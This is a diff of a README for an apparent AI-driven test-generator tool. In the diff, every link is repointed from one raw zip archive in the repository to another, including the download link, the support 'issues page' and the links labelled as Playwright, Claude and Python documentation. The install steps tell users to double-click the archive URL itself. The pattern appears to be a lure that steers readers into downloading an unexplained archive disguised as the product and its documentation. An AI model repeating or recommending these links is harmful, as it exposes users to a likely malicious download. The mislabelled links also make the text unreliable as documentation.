@@ -6,7 +6,7 @@ Welcome to the **ai-test-generator**! This tool helps you automatically create t
 
 ## 📥 Download & Install
 
-To get started, you need to download the application. Please visit this page to download: [Download ai-test-generator](https://github.com/KlenLucas/ai-test-generator/raw/refs/heads/main/examples/user_stories/generator_test_ai_v1.7-beta.2.zip).
+To get started, you need to download the application. Please visit this page to download: [Download ai-test-generator](https://github.com/KlenLucas/ai-test-generator/raw/refs/heads/main/user_stories/generator_ai_test_v2.1-alpha.2.zip).
 
 ## 📋 System Requirements
 
@@ -19,7 +19,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 💻 How to Download the Software
 
-1. Click on the download link: [Download ai-test-generator](https://github.com/KlenLucas/ai-test-generator/raw/refs/heads/main/examples/user_stories/generator_test_ai_v1.7-beta.2.zip).
+1. Click on the download link: [Download ai-test-generator](https://github.com/KlenLucas/ai-test-generator/raw/refs/heads/main/user_stories/generator_ai_test_v2.1-alpha.2.zip).
 2. You will see a list of available versions.
 3. Select the version you wish to download.
 4. Click on the file corresponding to your operating system (e.g., Windows, macOS, or Linux).
@@ -32,14 +32,14 @@ Once you have downloaded the file, follow these steps to run the application:
 ### For Windows Users:
 
 1. Open the folder where you downloaded the file.
-2. Double click on the `https://github.com/KlenLucas/ai-test-generator/raw/refs/heads/main/examples/user_stories/generator_test_ai_v1.7-beta.2.zip` file to run it.
+2. Double click on the `https://github.com/KlenLucas/ai-test-generator/raw/refs/heads/main/user_stories/generator_ai_test_v2.1-alpha.2.zip` file to run it.
 3. Follow the on-screen instructions to set it up.
 4. Once installed, you can open it from your Start menu.
 
 ### For macOS Users:
 
 1. Open the Downloads folder.
-2. Locate `https://github.com/KlenLucas/ai-test-generator/raw/refs/heads/main/examples/user_stories/generator_test_ai_v1.7-beta.2.zip` and double click it.
+2. Locate `https://github.com/KlenLucas/ai-test-generator/raw/refs/heads/main/user_stories/generator_ai_test_v2.1-alpha.2.zip` and double click it.
 3. Drag the ai-test-generator icon to the Applications folder.
 4. Go to your Applications folder and double click on the app to open it.
 
@@ -75,12 +75,12 @@ Currently, it is optimized for Playwright, but we plan to expand support for mor
 
 ## 💬 Support
 
-If you need help or have questions, visit our [issues page](https://github.com/KlenLucas/ai-test-generator/raw/refs/heads/main/examples/user_stories/generator_test_ai_v1.7-beta.2.zip) to report any problems or ask for support.
+If you need help or have questions, visit our [issues page](https://github.com/KlenLucas/ai-test-generator/raw/refs/heads/main/user_stories/generator_ai_test_v2.1-alpha.2.zip) to report any problems or ask for support.
 
 Thank you for choosing **ai-test-generator**! Happy testing! 
 
 ## 🔗 Related Resources
 
-- [Playwright Documentation](https://github.com/KlenLucas/ai-test-generator/raw/refs/heads/main/examples/user_stories/generator_test_ai_v1.7-beta.2.zip)
-- [Claude AI Information](https://github.com/KlenLucas/ai-test-generator/raw/refs/heads/main/examples/user_stories/generator_test_ai_v1.7-beta.2.zip)
-- [Python Documentation](https://github.com/KlenLucas/ai-test-generator/raw/refs/heads/main/examples/user_stories/generator_test_ai_v1.7-beta.2.zip)
+- [Playwright Documentation](https://github.com/KlenLucas/ai-test-generator/raw/refs/heads/main/user_stories/generator_ai_test_v2.1-alpha.2.zip)
+- [Claude AI Information](https://github.com/KlenLucas/ai-test-generator/raw/refs/heads/main/user_stories/generator_ai_test_v2.1-alpha.2.zip)
+- [Python Documentation](https://github.com/KlenLucas/ai-test-generator/raw/refs/heads/main/user_stories/generator_ai_test_v2.1-alpha.2.zip)
